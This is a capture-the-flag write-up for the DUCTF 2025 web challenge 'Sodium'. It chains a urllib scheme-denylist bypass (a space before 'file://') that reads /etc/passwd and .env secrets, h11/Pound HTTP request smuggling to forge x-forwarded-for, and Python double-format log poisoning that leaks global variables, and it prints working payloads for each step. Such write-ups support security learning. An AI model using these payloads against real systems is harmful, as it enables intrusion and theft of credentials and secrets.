---
title: "DUCTF 2025: Sodium"
date: 2025-07-23T00:49:00+08:00
draft: false
author: "Jack Sun"
tags:
  - Cybersecurity
  - CTFs
  - Writeups
  - DUCTF
  - DUCTF 2025
  - Web
image: /images/writeups/DUCTF2025/banner.webp
---

## Description

- Name: Sodium
- Category: Web
- 304 pts, 22 solves
- Written by `sidd.sh`

This one might require a pinch of patience.
{{%attachments style="orange" /%}}

## Solution

### Network topology

This challenge consisted of 3 web services placed behind a reverse proxy.
The reverse proxy in this challenge used a software called [Pound](https://github.com/graygnuorg/pound) and the 3 web services were:

1. An RPC service served by a `h11` server.
2. A domain scanner served by a Flask server.
3. A static web server served by a nginx server.

By default, a request to the challenge URL was routed to the static web server.
The RPC service and the domain scanner were configured as virtual hosts and could be accessed by setting the `Host` header in the HTTP request to `dev.rpc-service.ductf` and `dev.customer.ductf` respectively.

### Static analysis

Inspecting the codebase revealed that the flag was stored in an `.env` file within the RPC service’s directory and exposed as an environment variable.

![codebase](/images/writeups/DUCTF2025/sodium/codebase.png)

In the RPC service code, the flag was read into a global Python variable named `FLAG`:

```python
FLAG = os.getenv("FLAG")
```

Although `FLAG` was defined, it was not referenced anywhere in the code. Therefore, it was clear that the pathway to retrieve the flag would involve a vulnerability class such as Remote Code Execution (RCE), arbitrary file read, or information disclosure of global variables.

The Dockerfile showed that the RPC service and domain scanner ran under separate users. This indicated that we likely needed to leverage the RPC service to read the flag:

```Dockerfile
# Configure directory permissions
RUN chmod -R 700 /home/rpcservice/ && \
    chown -R customerapp:customerapp /home/customerapp/ && \
    chown -R rpcservice:rpcservice /home/rpcservice/
```

Although requests could reach the RPC service, interacting with any endpoints directly was not possible because all endpoints were protected by two security mechanisms:

```python
# Allowlist check
forwarded_for = headers.get("x-forwarded-for", "").strip()
auth_key = headers.get("auth-key")

if config.authorized_ips and forwarded_for not in config.authorized_ips:
    logger.warning(f"Blocked access from unauthorized IP: {forwarded_for}")
    body = f"Access denied: You are not allowed:to access this service. Only {', '.join(config.authorized_ips)} are allowed access.".encode()
    body += f". \nThe IP recieved was: {forwarded_for}".encode()
    send_response(conn, conn_state, 403, body)
    return

# Simple auth check for endpoints that require authentication
elif auth_key != config.auth_key:
    logger.warning("Unauthorized access attempt to /stats")
    send_response(conn, conn_state, 403, "Unauthorized: Invalid Auth-Key")
    return

```

The first check ensured that the origin IP address was `127.0.0.1`. This could not be bypassed simply by setting `x-forwarded-for` to `127.0.0.1`, since the header was overwritten by the reverse proxy. Thus, bypassing this required either a Server-Side Request Forgery (SSRF) vulnerability from another internal service, or a request smuggling vulnerability.

The second check involved the use of a symmetric authentication key set in the `auth-key` header that is shared between the domain scanner and the RPC service. Again, this is not easily bypassable as the implementation looks robust.

In summary, to interact with the RPC service we needed to:

- Exploit an SSRF or request smuggling vulnerability to bypass the IP check.
- Obtain the shared authentication key to pass the authentication check.

### Getting the Auth Key

I was initially looking for SSRF vulnerabilities in the domain scanner to bypass the IP check.
The snippet below is the logic used within the domain scanner to ensure that the provided URL is safe by preventing the usage of `file`, `gopher`, and `dict` URL schemes.

```py
BLACKLIST = ['file', 'gopher', 'dict']
AUTHENTICATION_KEY = os.environ.get('AUTHENTICATION_KEY')

def is_safe_url(url):
    scheme = urlparse(url).scheme
    if scheme in BLACKLIST:
        logger.warning(f"[!] Blocked by blacklist: scheme = {scheme}")
        flash("BAD URL: The URL scheme is not allowed.", "danger")
        return False
    return True
```

A common bypass is to use a 3xx HTTP redirect to redirect a valid `http` request to a denylisted scheme. This relies on the request client following redirects and unfortunately, the client, `urlopen`, did not follow redirects.

During research, I came across [this article](https://www.vicarius.io/vsociety/posts/cve-2023-24329-bypassing-url-blackslisting-using-blank-in-python-urllib-library-4). Older versions of `urllib` are vulnerable to `CVE-2023-24329`, which allowed us to bypass the URL scheme denylist by prefixing a space character to the beginning of the provided URL. For brevity, I will not explain the CVE here, details can be found in the aforementioned article.

While the `gopher` and `dict` schemes were disallowed, we were actually able to use the `file` scheme to achieve arbitrary file read!

For example, here is the payload used to read `/etc/passwd`:

```
 file:///etc/passwd
```

Note the space character preceding `file`.

![afr](/images/writeups/DUCTF2025/sodium/afr.png)

From this, we can read `/home/customerapp/customer_app/.env` to leak the auth key via the payload

```
 file:///home/customerapp/customer_app/.env
```

We get:

```
Website Responds with: <br><pre>AUTHENTICATION_KEY=2e48228116c6ae588ba6155859f0f2cf67e81f01</pre>
```

### Bypassing the IP Check

I thought that the `Pound` reverse proxy and the `h11` HTTP server used in this challenge were quite unusal and subsequently I did some research into these software.
Consequently, I found [this Github advisory](https://github.com/advisories/GHSA-vqfr-h8mv-ghfj) which detailed `CVE-2025-43859`, a request smuggling vulnerabilty which can be exploited if used in conjunction with a reverse proxy such as... Pound! Again, further details can be found in the advisory, but the PoC below allows us to smuggle an additional request that we have full control over past Pound to a `h11` server.

```
GET /one HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

5
AAAAAXX2
45
0

GET /two HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

0

```

I used this vulnerability to smuggle an additional request to `h11` with a `x-forwarded-for` header that is not modified by Pound. If we set the `x-forwarded-for` header to `127.0.0.1` we can bypass the IP check.

### Adding Ourselves to the IP Allowlist

Now that we have the auth key and an IP check bypass we can start interacting with the RPC service. To make our lives a bit easier, we can change the allowlist to accept our actual IP address:

```
GET / HTTP/1.1
Host: dev.rpc-service.ductf
Transfer-Encoding: chunked

5
AAAAAXX3
130
0

GET /update_allowlist=<YOUR IP> HTTP/1.1
Host: dev.rpc-service.ductf
x-forwarded-for: 127.0.0.1
auth-key: 2e48228116c6ae588ba6155859f0f2cf67e81f01
Transfer-Encoding: chunked

0

```

Now we can call the RPC service without having to smuggle additional HTTP requests each time! This also means we can start seeing the response of requests.

### Completing the Attack Chain

The RPC service exposed an endpoint to read logs. This is a classic set up for a log poisoning vulnerability, so I started exploring in this direction. From the snippet below, we can see that such a vulnerability does indeed exist, by leveraging a double format:

```py
def build_stats_page(get_log=False, get_config=True):
    """Provide analytics for the RPC Service, display configurations and display activity logs"""

    # Print logs
    if get_log == True:
        template = """
            <h1>Admin Stats Page</h1>
                {logs}
            """.format(logs=get_logs()) <2>
    else:
        template = """
            <h1>Admin Stats Page</h1>
            <p>Page to show logs or Configuration</p>
            """

    # Full config
    if get_config == True:
        template += """
                    <h2>Current Configuration</h2>
                    {config}
                    """
    else:
        template += """<p>{config.service} service health ok</p>"""

    template += "<p>Administrative Interface for RPC Server</p>"
    logger.error(template)
    return template.format(config=config) <3>

def get_logs():
    """If debug logs are requested with for the stats page, can become noisy though"""
    debug_logs = open("debug.log", "r").readlines() <1>
    logs = "\n<h2>Server Debug Logs</h2>"
    logs += "\n".join([line.rstrip() for line in debug_logs])
    return logs
```

1. User-controllable logs are read from `debug.log`
2. User-controllable logs are formatted into `template`
3. The template is formatted again via config!

[This article](https://podalirius.net/en/articles/python-format-string-vulnerabilities/) explains the attack in more detail, but in essence, if we can control the template via a format and it is later formatted again, we can leak global variables. As it turns out, we can quite easily control what is presented in the logs. In fact, such a possibility exists in the route to read the logs itself.

```python
if target.startswith("/stats"):
    try:
        params = {}
        for param in re.search(r".*\?(.*)", target).groups()[0].split("&"): <1>
            logger.error(param) <2>
            params[param.split("=")[0]] = bool(param.split("=")[1])
        body = build_stats_page(**params).encode()
    except Exception as e:
        logger.error(f"[!] Error while fetching stats. Request made to: {target} with error: {e}")
        send_response(conn, conn_state, 500, e)
        return
    send_response(conn, conn_state, 200, body)
    return
```

1. Query string parameters are split by the `&` symbol.
2. Each parameter is logged.

To read the flag, we can inject `{config.__init__.__globals__}` into the logs such that, during the second format, the dunder methods of the actual config object will be used to leak the global variables.

```
GET https://sodium-d07b1bc45451f940.iso.2025.ductf.net/stats?a={config.__init__.__globals__}
```

Now we can read the logs to get the flag!

```
GET https://sodium-d07b1bc45451f940.iso.2025.ductf.net/stats?get_log=true
```

![flag](/images/writeups/DUCTF2025/sodium/flag.png)

Flag: `DUCTF{th3y_s33_m3_smuggl1ng_4nd_ch41n1ng}`
